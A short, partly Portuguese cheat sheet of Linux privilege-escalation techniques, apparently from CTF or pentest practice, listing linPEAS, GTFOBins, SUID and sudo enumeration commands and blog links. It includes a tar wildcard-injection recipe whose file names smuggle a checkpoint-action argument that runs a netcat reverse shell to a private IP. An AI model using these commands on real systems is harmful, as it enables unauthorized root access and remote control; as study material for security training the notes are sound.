privalege scalation

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

**find / -user root -perm -4000 -exec ls -ldb {} \\;**

**pega arquivos que permitem escrita -d para dir**

```
find -type f -maxdepth 1  -writable
```

SUID

**como explorar systemctl com SUID**

https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49

**explora a capacidade do tar * :** https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.78.174 1234 >/tmp/f" > shell.sh; touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"; touch "/var/www/html/--checkpoint=1"

mostra o que que os usuarios tem como acesso:

sudo -l

**como fazer priv escalation com gerenciadores de pacotes:** [https://blog.ikuamike.io/posts/2021/package\_managers\_privesc/#method-2-loading-a-custom-yum-plugin](https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-2-loading-a-custom-yum-plugin)

https://gtfobins.github.io/gtfobins/bash/#suid